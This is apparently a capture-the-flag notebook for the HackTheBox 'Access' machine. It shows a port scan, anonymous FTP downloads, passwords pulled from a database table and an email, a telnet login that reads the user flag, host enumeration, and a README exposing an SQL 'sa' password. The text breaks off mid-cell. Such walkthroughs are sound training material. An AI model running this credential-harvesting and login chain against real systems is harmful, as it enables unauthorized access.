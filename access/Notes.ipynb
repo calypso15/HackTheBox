{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-27 15:19 EST\n",
      "Nmap scan report for 10.10.10.98\n",
      "Host is up (0.041s latency).\n",
      "Not shown: 997 filtered ports\n",
      "PORT   STATE SERVICE VERSION\n",
      "21/tcp open  ftp     Microsoft ftpd\n",
      "| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n",
      "|_Can't get directory listing: PASV failed: 425 Cannot open data connection.\n",
      "| ftp-syst: \n",
      "|_  SYST: Windows_NT\n",
      "23/tcp open  telnet?\n",
      "80/tcp open  http    Microsoft IIS httpd 7.5\n",
      "| http-methods: \n",
      "|_  Potentially risky methods: TRACE\n",
      "|_http-server-header: Microsoft-IIS/7.5\n",
      "|_http-title: MegaCorp\n",
      "Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\n",
      "Device type: general purpose|phone|specialized\n",
      "Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\n",
      "OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\n",
      "Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\n",
      "No exact OS matches for host (test conditions non-ideal).\n",
      "Network Distance: 2 hops\n",
      "Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n",
      "\n",
      "TRACEROUTE (using port 21/tcp)\n",
      "HOP RTT      ADDRESS\n",
      "1   42.33 ms 10.10.14.1\n",
      "2   42.90 ms 10.10.10.98\n",
      "\n",
      "OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n",
      "Nmap done: 1 IP address (1 host up) scanned in 181.08 seconds\n"
     ]
    }
   ],
   "source": [
    "# Initial recon\n",
    "!nmap -A 10.10.10.98"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "* Expire in 0 ms for 6 (transfer 0x55b8715aec60)\n",
      "*   Trying 10.10.10.98...\n",
      "* TCP_NODELAY set\n",
      "* Expire in 200 ms for 4 (transfer 0x55b8715aec60)\n",
      "* Connected to 10.10.10.98 (10.10.10.98) port 80 (#0)\n",
      "> GET / HTTP/1.1\n",
      "> Host: 10.10.10.98\n",
      "> User-Agent: curl/7.64.0\n",
      "> Accept: */*\n",
      "> \n",
      "< HTTP/1.1 200 OK\n",
      "< Content-Type: text/html\n",
      "< Last-Modified: Thu, 23 Aug 2018 23:33:43 GMT\n",
      "< Accept-Ranges: bytes\n",
      "< ETag: \"44a87bb393bd41:0\"\n",
      "< Server: Microsoft-IIS/7.5\n",
      "< X-Powered-By: ASP.NET\n",
      "< Date: Wed, 27 Feb 2019 20:37:05 GMT\n",
      "< Content-Length: 391\n",
      "< \n",
      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n",
      "<html>\n",
      "<head>\n",
      "<title>MegaCorp</title>\n",
      "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n",
      "</head>\n",
      "\n",
      "<body>\n",
      "<div align=\"center\">\n",
      "  <p><strong><font size=\"5\" face=\"Verdana, Arial, Helvetica, sans-serif\">LON-MC6</font></strong> </p>\n",
      "  <p><img border=\"0\" src=\"out.jpg\"></p>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "* Connection #0 to host 10.10.10.98 left intact\n"
     ]
    }
   ],
   "source": [
    "# Grab the main page for the HTTP server\n",
    "!curl -v 10.10.10.98"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "root@kali:~/git/HackTheBox/access# ftp 10.10.10.98\n",
    "Connected to 10.10.10.98.\n",
    "220 Microsoft FTP Service\n",
    "Name (10.10.10.98:root): anonymous\n",
    "331 Anonymous access allowed, send identity (e-mail name) as password.\n",
    "Password:\n",
    "230 User logged in.\n",
    "Remote system type is Windows_NT.\n",
    "ftp> ls\n",
    "200 PORT command successful.\n",
    "125 Data connection already open; Transfer starting.\n",
    "08-23-18  08:16PM       <DIR>          Backups\n",
    "08-24-18  09:00PM       <DIR>          Engineer\n",
    "226 Transfer complete.\n",
    "ftp> cd Backups\n",
    "250 CWD command successful.\n",
    "ftp> ls\n",
    "200 PORT command successful.\n",
    "125 Data connection already open; Transfer starting.\n",
    "08-23-18  08:16PM              5652480 backup.mdb\n",
    "226 Transfer complete.\n",
    "ftp> binary\n",
    "200 Type set to I.\n",
    "ftp> get backup.mdb\n",
    "local: backup.mdb remote: backup.mdb\n",
    "200 PORT command successful.\n",
    "125 Data connection already open; Transfer starting.\n",
    "226 Transfer complete.\n",
    "5652480 bytes received in 2.34 secs (2.3054 MB/s)\n",
    "ftp> cd ..\n",
    "250 CWD command successful.\n",
    "ftp> cd Engineer\n",
    "250 CWD command successful.\n",
    "ftp> ls\n",
    "200 PORT command successful.\n",
    "125 Data connection already open; Transfer starting.\n",
    "08-24-18  12:16AM                10870 Access Control.zip\n",
    "226 Transfer complete.\n",
    "ftp> get Access\\ Control.zip\n",
    "local: Access Control.zip remote: Access Control.zip\n",
    "200 PORT command successful.\n",
    "125 Data connection already open; Transfer starting.\n",
    "226 Transfer complete.\n",
    "10870 bytes received in 0.12 secs (88.0684 kB/s)\n",
    "ftp> quit\n",
    "221 Goodbye."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "!mv 'Access Control.zip' Access_Control.zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archive:  Access_Control.zip\r\n",
      "   skipping: Access Control.pst      unsupported compression method 99\r\n"
     ]
    }
   ],
   "source": [
    "!unzip Access_Control.zip"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "> Access_Control.zip is password protected."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`Open 'backup.mdb' with Access`  \n",
    ">Contains a bunch of tables. Potentially of interest: UserInfo, auth_user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`Open 'UserInfo'`  \n",
    "> USERID\tBadgenumber\tSSN\tname\tGender\tTITLE\tPAGER\tBIRTHDAY\tHIREDDAY\tstreet\tCITY\tSTATE\tZIP\tOPHONE\tFPHONE\tVERIFICATIONMETHOD\tDEFAULTDEPTID\tSECURITYFLAGS\tATT\tINLATE\tOUTEARLY\tOVERTIME\tSEP\tHOLIDAY\tMINZU\tPASSWORD\tLUNCHDURATION\tPHOTO\tmverifypass\tNotes\tprivilege\tInheritDeptSch\tInheritDeptSchClass\tAutoSchPlan\tMinAutoSchInterval\tRegisterOT\tInheritDeptRule\tEMPRIVILEGE\tCardNo\tchange_operator\tchange_time\tcreate_operator\tcreate_time\tdelete_operator\tdelete_time\tstatus\tlastname\tAccGroup\tTimeZones\tidentitycard\tUTime\tEducation\tOffDuty\tDelTag\tmorecard_group_id\tset_valid_time\tacc_startdate\tacc_enddate\tbirthplace\tPolitical\tcontry\thiretype\temail\tfiredate\tisatt\thomeaddress\temptype\tbankcode1\tbankcode2\tisblacklist\tIuser1\tIuser2\tIuser3\tIuser4\tIuser5\tCuser1\tCuser2\tCuser3\tCuser4\tCuser5\tDuser1\tDuser2\tDuser3\tDuser4\tDuser5\treserve\tOfflineBeginDate\tOfflineEndDate\tcarNo\tcarType\tcarBrand\tcarColor\n",
    "1\t538\t0\tJohn\tM\t\t\t3/25/2018 9:31:40 PM\t4/10/2018 9:35:19 PM\t\t\t\t\t\t\t\t47\t\t1\t0\t1\t1\t1\t1\t\t020481\t1\t\t\t\t0\t1\t1\t1\t24\t1\t1\t0\t\t\t\t\t\t\t\t0\tCarter\t0\t\t\t\t\t0\t0\t0\tNo\t\t\t\t\t\t0\t\t\tYes\t \t0\t\t\t0\t0\t0\t0\t0\t0\t\t\t\t\t\t\t\t\t\t\t0\t\t\t\t\t\t\n",
    "2\t511\t0\tMark\tM\t\t\t5/16/2018 9:44:28 PM\t8/10/2018 9:44:38 PM\t\t\t\t\t\t\t\t49\t\t1\t0\t1\t1\t1\t1\t\t010101\t1\t\t\t\t0\t1\t1\t1\t24\t1\t1\t0\t\t\t\t\t\t\t\t0\tSmith\t0\t\t\t\t\t0\t0\t0\tNo\t\t\t\t\t\t0\t\t\tYes\t \t0\t\t\t0\t0\t0\t0\t0\t0\t\t\t\t\t\t\t\t\t\t\t0\t\t\t\t\t\t\n",
    "3\t502\t0\tSunita\tF\t\t\t8/21/2018 9:44:49 PM\t8/21/2018 9:46:50 PM\t\t\t\t\t\t\t\t49\t\t1\t0\t1\t1\t1\t1\t\t000000\t1\t\t\t\t0\t1\t1\t1\t24\t1\t1\t0\t\t\t\t\t\t\t\t0\tRahman\t0\t\t\t\t\t0\t0\t0\tNo\t\t\t\t\t\t0\t\t\tYes\t \t0\t\t\t0\t0\t0\t0\t0\t0\t\t\t\t\t\t\t\t\t\t\t0\t\t\t\t\t\t\n",
    "4\t505\t0\tMary\tM\t\t\t8/18/2018 9:47:09 PM\t8/21/2018 9:48:40 PM\t\t\t\t\t\t\t\t48\t\t1\t0\t1\t1\t1\t1\t\t666666\t1\t\t\t\t0\t1\t1\t1\t24\t1\t1\t0\t\t\t\t\t\t\t\t0\tJones\t0\t\t\t\t\t0\t0\t0\tNo\t\t\t\t\t\t0\t\t\tYes\t \t0\t\t\t0\t0\t0\t0\t0\t0\t\t\t\t\t\t\t\t\t\t\t0\t\t\t\t\t\t\n",
    "5\t510\t0\tMonica\tF\t\t\t1/2/2018 9:14:11 PM\t8/22/2018 9:14:11 PM\t\t\t\t\t\t\t\t50\t\t1\t0\t1\t1\t1\t1\t\t123321\t1\t\t\t\t0\t1\t1\t1\t24\t1\t1\t0\t\t\t\t\t\t\t\t0\tNunes\t0\t\t\t\t\t0\t0\t0\tNo\t\t\t\t\t\t0\t\t\tYes\t \t0\t\t\t0\t0\t0\t0\t0\t0\t\t\t\t\t\t\t\t\t\t\t0\t\t\t\t\t\t"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`Open 'auth_user'`  \n",
    "> id\tusername\tpassword\tStatus\tlast_login\tRoleID\tRemark\n",
    "25\tadmin\tadmin\t1\t8/23/2018 9:11:47 PM\t26\t\n",
    "27\tengineer\taccess4u@security\t1\t8/23/2018 9:13:36 PM\t26\t\n",
    "28\tbackup_admin\tadmin\t1\t8/23/2018 9:14:02 PM\t26\t"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo \"engineer / access4u@security\" >> creds.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\r\n",
      "p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz (206D7),ASM,AES-NI)\r\n",
      "\r\n",
      "Scanning the drive for archives:\r\n",
      "  0M Scan\b\b\b\b\b\b\b\b\b         \b\b\b\b\b\b\b\b\b1 file, 10870 bytes (11 KiB)\r\n",
      "\r\n",
      "Extracting archive: Access_Control.zip\r\n",
      "--\r\n",
      "Path = Access_Control.zip\r\n",
      "Type = zip\r\n",
      "Physical Size = 10870\r\n",
      "\r\n",
      "  0%\b\b\b\b    \b\b\b\bEverything is Ok\r\n",
      "\r\n",
      "Size:       271360\r\n",
      "Compressed: 10870\r\n"
     ]
    }
   ],
   "source": [
    "!7z x -paccess4u@security Access_Control.zip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "!mv 'Access Control.pst' Access_Control.pst"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Email\tFrom: john@megacorp.com\tSubject: MegaCorp Access Control System \"security\" account\r\n"
     ]
    }
   ],
   "source": [
    "!lspst Access_Control.pst"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Opening PST file and indexes...\r\n",
      "Processing Folder \"Deleted Items\"\r\n",
      "\t\"Access Control\" - 2 items done, 0 items skipped.\r\n"
     ]
    }
   ],
   "source": [
    "!readpst -S Access_Control.pst"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "!mv 'Access Control' Access_Control"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Access_Control:\r\n",
      "total 12K\r\n",
      "drwxr-xr-x 2 root root 4.0K Feb 27 16:15 .\r\n",
      "drwxr-xr-x 4 root root 4.0K Feb 27 16:16 ..\r\n",
      "-rw-r--r-- 1 root root 3.0K Feb 27 16:15 2\r\n"
     ]
    }
   ],
   "source": [
    "!ls -lahR Access_Control"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Status: RO\r\n",
      "From: john@megacorp.com <john@megacorp.com>\r\n",
      "Subject: MegaCorp Access Control System \"security\" account\r\n",
      "To: 'security@accesscontrolsystems.com'\r\n",
      "Date: Thu, 23 Aug 2018 23:44:07 +0000\r\n",
      "MIME-Version: 1.0\r\n",
      "Content-Type: multipart/mixed;\r\n",
      "\tboundary=\"--boundary-LibPST-iamunique-1009458489_-_-\"\r\n",
      "\r\n",
      "\r\n",
      "----boundary-LibPST-iamunique-1009458489_-_-\r\n",
      "Content-Type: multipart/alternative;\r\n",
      "\tboundary=\"alt---boundary-LibPST-iamunique-1009458489_-_-\"\r\n",
      "\r\n",
      "--alt---boundary-LibPST-iamunique-1009458489_-_-\r\n",
      "Content-Type: text/plain; charset=\"utf-8\"\r\n",
      "\r\n",
      "Hi there,\r\n",
      "\r\n",
      " \r\n",
      "\r\n",
      "The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.\r\n",
      "\r\n",
      " \r\n",
      "\r\n",
      "Regards,\r\n",
      "\r\n",
      "John\r\n",
      "\r\n",
      "\r\n",
      "--alt---boundary-LibPST-iamunique-1009458489_-_-\r\n",
      "Content-Type: text/html; charset=\"us-ascii\"\r\n",
      "\r\n",
      "<html xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:w=\"urn:schemas-microsoft-com:office:word\" xmlns:m=\"http://schemas.microsoft.com/office/2004/12/omml\" xmlns=\"http://www.w3.org/TR/REC-html40\"><head><meta http-equiv=Content-Type content=\"text/html; charset=us-ascii\"><meta name=Generator content=\"Microsoft Word 15 (filtered medium)\"><style><!--\r\n",
      "/* Font Definitions */\r\n",
      "@font-face\r\n",
      "\t{font-family:\"Cambria Math\";\r\n",
      "\tpanose-1:0 0 0 0 0 0 0 0 0 0;}\r\n",
      "@font-face\r\n",
      "\t{font-family:Calibri;\r\n",
      "\tpanose-1:2 15 5 2 2 2 4 3 2 4;}\r\n",
      "/* Style Definitions */\r\n",
      "p.MsoNormal, li.MsoNormal, div.MsoNormal\r\n",
      "\t{margin:0in;\r\n",
      "\tmargin-bottom:.0001pt;\r\n",
      "\tfont-size:11.0pt;\r\n",
      "\tfont-family:\"Calibri\",sans-serif;}\r\n",
      "a:link, span.MsoHyperlink\r\n",
      "\t{mso-style-priority:99;\r\n",
      "\tcolor:#0563C1;\r\n",
      "\ttext-decoration:underline;}\r\n",
      "a:visited, span.MsoHyperlinkFollowed\r\n",
      "\t{mso-style-priority:99;\r\n",
      "\tcolor:#954F72;\r\n",
      "\ttext-decoration:underline;}\r\n",
      "p.msonormal0, li.msonormal0, div.msonormal0\r\n",
      "\t{mso-style-name:msonormal;\r\n",
      "\tmso-margin-top-alt:auto;\r\n",
      "\tmargin-right:0in;\r\n",
      "\tmso-margin-bottom-alt:auto;\r\n",
      "\tmargin-left:0in;\r\n",
      "\tfont-size:11.0pt;\r\n",
      "\tfont-family:\"Calibri\",sans-serif;}\r\n",
      "span.EmailStyle18\r\n",
      "\t{mso-style-type:personal-compose;\r\n",
      "\tfont-family:\"Calibri\",sans-serif;\r\n",
      "\tcolor:windowtext;}\r\n",
      ".MsoChpDefault\r\n",
      "\t{mso-style-type:export-only;\r\n",
      "\tfont-size:10.0pt;\r\n",
      "\tfont-family:\"Calibri\",sans-serif;}\r\n",
      "@page WordSection1\r\n",
      "\t{size:8.5in 11.0in;\r\n",
      "\tmargin:1.0in 1.0in 1.0in 1.0in;}\r\n",
      "div.WordSection1\r\n",
      "\t{page:WordSection1;}\r\n",
      "--></style><!--[if gte mso 9]><xml>\r\n",
      "<o:shapedefaults v:ext=\"edit\" spidmax=\"1026\" />\r\n",
      "</xml><![endif]--><!--[if gte mso 9]><xml>\r\n",
      "<o:shapelayout v:ext=\"edit\">\r\n",
      "<o:idmap v:ext=\"edit\" data=\"1\" />\r\n",
      "</o:shapelayout></xml><![endif]--></head><body lang=EN-US link=\"#0563C1\" vlink=\"#954F72\"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>\r\n",
      "--alt---boundary-LibPST-iamunique-1009458489_-_---\r\n",
      "\r\n",
      "----boundary-LibPST-iamunique-1009458489_-_---\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "!cat Access_Control/2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo \"security / 4Cc3ssC0ntr0ller\" >> creds.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "engineer / access4u@security\r\n",
      "security / 4Cc3ssC0ntr0ller\r\n"
     ]
    }
   ],
   "source": [
    "!cat creds.txt"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "root@kali:~/git/HackTheBox/access# telnet 10.10.10.98\n",
    "Trying 10.10.10.98...\n",
    "Connected to 10.10.10.98.\n",
    "Escape character is '^]'.\n",
    "Welcome to Microsoft Telnet Service \n",
    "\n",
    "login: security\n",
    "password: \n",
    "\n",
    "*===============================================================\n",
    "Microsoft Telnet Server.\n",
    "*===============================================================\n",
    "\n",
    "C:\\Users\\security>dir\n",
    " Volume in drive C has no label.\n",
    " Volume Serial Number is 9C45-DBF0\n",
    "\n",
    " Directory of C:\\Users\\security\n",
    "\n",
    "02/25/2019  05:02 AM    <DIR>          .\n",
    "02/25/2019  05:02 AM    <DIR>          ..\n",
    "08/24/2018  07:37 PM    <DIR>          .yawcam\n",
    "08/21/2018  10:35 PM    <DIR>          Contacts\n",
    "08/28/2018  06:51 AM    <DIR>          Desktop\n",
    "08/21/2018  10:35 PM    <DIR>          Documents\n",
    "08/21/2018  10:35 PM    <DIR>          Downloads\n",
    "08/21/2018  10:35 PM    <DIR>          Favorites\n",
    "08/21/2018  10:35 PM    <DIR>          Links\n",
    "08/21/2018  10:35 PM    <DIR>          Music\n",
    "08/21/2018  10:35 PM    <DIR>          Pictures\n",
    "08/21/2018  10:35 PM    <DIR>          Saved Games\n",
    "08/21/2018  10:35 PM    <DIR>          Searches\n",
    "08/24/2018  07:39 PM    <DIR>          Videos\n",
    "               0 File(s)              0 bytes\n",
    "              14 Dir(s)  16,689,774,592 bytes free\n",
    "\n",
    "C:\\Users\\security>cd Desktop\n",
    "\n",
    "C:\\Users\\security\\Desktop>dir\n",
    " Volume in drive C has no label.\n",
    " Volume Serial Number is 9C45-DBF0\n",
    "\n",
    " Directory of C:\\Users\\security\\Desktop\n",
    "\n",
    "08/28/2018  06:51 AM    <DIR>          .\n",
    "08/28/2018  06:51 AM    <DIR>          ..\n",
    "08/21/2018  10:37 PM                32 user.txt\n",
    "               1 File(s)             32 bytes\n",
    "               2 Dir(s)  16,689,774,592 bytes free\n",
    "\n",
    "C:\\Users\\security\\Desktop>type user.txt\n",
    "ff1f3b48913b213a31ff6756d2553d38\n",
    "C:\\Users\\security\\Desktop>"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "C:\\Users\\security>systeminfo\n",
    "\n",
    "Host Name:                 ACCESS\n",
    "OS Name:                   Microsoft Windows Server 2008 R2 Standard \n",
    "OS Version:                6.1.7600 N/A Build 7600\n",
    "OS Manufacturer:           Microsoft Corporation\n",
    "OS Configuration:          Standalone Server\n",
    "OS Build Type:             Multiprocessor Free\n",
    "Registered Owner:          Windows User\n",
    "Registered Organization:   \n",
    "Product ID:                55041-507-9857321-84191\n",
    "Original Install Date:     8/21/2018, 9:43:10 PM\n",
    "System Boot Time:          2/25/2019, 12:33:22 AM\n",
    "System Manufacturer:       VMware, Inc.\n",
    "System Model:              VMware Virtual Platform\n",
    "System Type:               x64-based PC\n",
    "Processor(s):              2 Processor(s) Installed.\n",
    "                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2594 Mhz\n",
    "                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2594 Mhz\n",
    "BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016\n",
    "Windows Directory:         C:\\Windows\n",
    "System Directory:          C:\\Windows\\system32\n",
    "Boot Device:               \\Device\\HarddiskVolume1\n",
    "System Locale:             en-us;English (United States)\n",
    "Input Locale:              en-us;English (United States)\n",
    "Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London\n",
    "Total Physical Memory:     2,047 MB\n",
    "Available Physical Memory: 1,484 MB\n",
    "Virtual Memory: Max Size:  4,095 MB\n",
    "Virtual Memory: Available: 3,512 MB\n",
    "Virtual Memory: In Use:    583 MB\n",
    "Page File Location(s):     C:\\pagefile.sys\n",
    "Domain:                    HTB\n",
    "Logon Server:              N/A\n",
    "Hotfix(s):                 110 Hotfix(s) Installed.\n",
    "                           [01]: KB981391\n",
    "                           [02]: KB981392\n",
    "                           [03]: KB977236\n",
    "                           [04]: KB981111\n",
    "                           [05]: KB977238\n",
    "                           [06]: KB977239\n",
    "                           [07]: KB981390\n",
    "                           [08]: KB2032276\n",
    "                           [09]: KB2296011\n",
    "                           [10]: KB2305420\n",
    "                           [11]: KB2345886\n",
    "                           [12]: KB2347290\n",
    "                           [13]: KB2378111\n",
    "                           [14]: KB2386667\n",
    "                           [15]: KB2387149\n",
    "                           [16]: KB2393802\n",
    "                           [17]: KB2419640\n",
    "                           [18]: KB2423089\n",
    "                           [19]: KB2425227\n",
    "                           [20]: KB2442962\n",
    "                           [21]: KB2454826\n",
    "                           [22]: KB2467023\n",
    "                           [23]: KB2479943\n",
    "                           [24]: KB2483614\n",
    "                           [25]: KB2484033\n",
    "                           [26]: KB2488113\n",
    "                           [27]: KB2505438\n",
    "                           [28]: KB2506014\n",
    "                           [29]: KB2506212\n",
    "                           [30]: KB2506928\n",
    "                           [31]: KB2509553\n",
    "                           [32]: KB2511250\n",
    "                           [33]: KB2511455\n",
    "                           [34]: KB2522422\n",
    "                           [35]: KB2529073\n",
    "                           [36]: KB2535512\n",
    "                           [37]: KB2544893\n",
    "                           [38]: KB2545698\n",
    "                           [39]: KB2547666\n",
    "                           [40]: KB2552343\n",
    "                           [41]: KB2560656\n",
    "                           [42]: KB2563227\n",
    "                           [43]: KB2564958\n",
    "                           [44]: KB2570947\n",
    "                           [45]: KB2585542\n",
    "                           [46]: KB2598845\n",
    "                           [47]: KB2603229\n",
    "                           [48]: KB2604114\n",
    "                           [49]: KB2607047\n",
    "                           [50]: KB2608658\n",
    "                           [51]: KB2618451\n",
    "                           [52]: KB2620704\n",
    "                           [53]: KB2621440\n",
    "                           [54]: KB2631813\n",
    "                           [55]: KB2640148\n",
    "                           [56]: KB2643719\n",
    "                           [57]: KB2653956\n",
    "                           [58]: KB2654428\n",
    "                           [59]: KB2656355\n",
    "                           [60]: KB2660075\n",
    "                           [61]: KB2667402\n",
    "                           [62]: KB2676562\n",
    "                           [63]: KB2685811\n",
    "                           [64]: KB2685813\n",
    "                           [65]: KB2685939\n",
    "                           [66]: KB2690533\n",
    "                           [67]: KB2698365\n",
    "                           [68]: KB2705219\n",
    "                           [69]: KB2709630\n",
    "                           [70]: KB2712808\n",
    "                           [71]: KB2716513\n",
    "                           [72]: KB2718704\n",
    "                           [73]: KB2719033\n",
    "                           [74]: KB2726535\n",
    "                           [75]: KB2727528\n",
    "                           [76]: KB2729094\n",
    "                           [77]: KB2729451\n",
    "                           [78]: KB2741355\n",
    "                           [79]: KB2742598\n",
    "                           [80]: KB2748349\n",
    "                           [81]: KB2758857\n",
    "                           [82]: KB2761217\n",
    "                           [83]: KB2765809\n",
    "                           [84]: KB2770660\n",
    "                           [85]: KB2789644\n",
    "                           [86]: KB2791765\n",
    "                           [87]: KB2807986\n",
    "                           [88]: KB2813347\n",
    "                           [89]: KB2840149\n",
    "                           [90]: KB2998812\n",
    "                           [91]: KB958488\n",
    "                           [92]: KB972270\n",
    "                           [93]: KB974431\n",
    "                           [94]: KB974571\n",
    "                           [95]: KB975467\n",
    "                           [96]: KB975560\n",
    "                           [97]: KB977074\n",
    "                           [98]: KB978542\n",
    "                           [99]: KB978601\n",
    "                           [100]: KB979099\n",
    "                           [101]: KB979309\n",
    "                           [102]: KB979482\n",
    "                           [103]: KB979538\n",
    "                           [104]: KB979687\n",
    "                           [105]: KB979688\n",
    "                           [106]: KB980408\n",
    "                           [107]: KB980846\n",
    "                           [108]: KB982018\n",
    "                           [109]: KB982132\n",
    "                           [110]: KB982799\n",
    "Network Card(s):           1 NIC(s) Installed.\n",
    "                           [01]: Intel(R) PRO/1000 MT Network Connection\n",
    "                                 Connection Name: Local Area Connection\n",
    "                                 DHCP Enabled:    No\n",
    "                                 IP address(es)\n",
    "                                 [01]: 10.10.10.98\n",
    "                                 [02]: fe80::71b7:ad84:6b22:4ec0\n",
    "                                 [03]: dead:beef::71b7:ad84:6b22:4ec0\n",
    "\n",
    "C:\\Users\\security>net users\n",
    "\n",
    "User accounts for \\\\ACCESS\n",
    "\n",
    "-------------------------------------------------------------------------------\n",
    "Administrator            engineer                 Guest                    \n",
    "security                 \n",
    "The command completed successfully.\n",
    "\n",
    "C:\\Users\\security>net localgroup\n",
    "\n",
    "Aliases for \\\\ACCESS\n",
    "\n",
    "-------------------------------------------------------------------------------\n",
    "*Administrators\n",
    "*Backup Operators\n",
    "*Certificate Service DCOM Access\n",
    "*Cryptographic Operators\n",
    "*Distributed COM Users\n",
    "*Event Log Readers\n",
    "*Guests\n",
    "*IIS_IUSRS\n",
    "*Network Configuration Operators\n",
    "*Performance Log Users\n",
    "*Performance Monitor Users\n",
    "*Power Users\n",
    "*Print Operators\n",
    "*Remote Desktop Users\n",
    "*Replicator\n",
    "*TelnetClients\n",
    "*Users\n",
    "The command completed successfully."
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "C:\\temp\\scripts>type README*\n",
    "\n",
    "README_FIRST.txt\n",
    "\n",
    "\n",
    "Open the SQL Management Studio application located either here:\n",
    "   \"C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\Ssms.exe\"\n",
    "Or here:\n",
    "   \"C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\Ssms.exe\"\n",
    " \n",
    "- When it opens the \"Connect to Server\" dialog, under \"Server name:\" type \"LOCALHOST\", \"Authentication:\" selected must be \"SQL Server Authentication\".\n",
    " \n",
    "   \"Login:\" = \"sa\"\n",
    "   \"Password:\" = \"htrcy@HXeryNJCTRHcnb45CJRY\"\n",
    " \n",
    "- Click \"Connect\", once connected click on the \"Open File\" icon, navigate to the folder where the scripts are saved (c:\\temp\\scripts).\n",
    "- Select each script in order of name by the first number in the name and run them in order e.g. \"1_CREATE_SYSDBA.sql\" then \"2_ALTER_SERVER_ROLE.sql\" then \"3_SP_ATTACH_DB.sql\" then \"4_ALTER_AUTHORIZATION.sql\"\n",
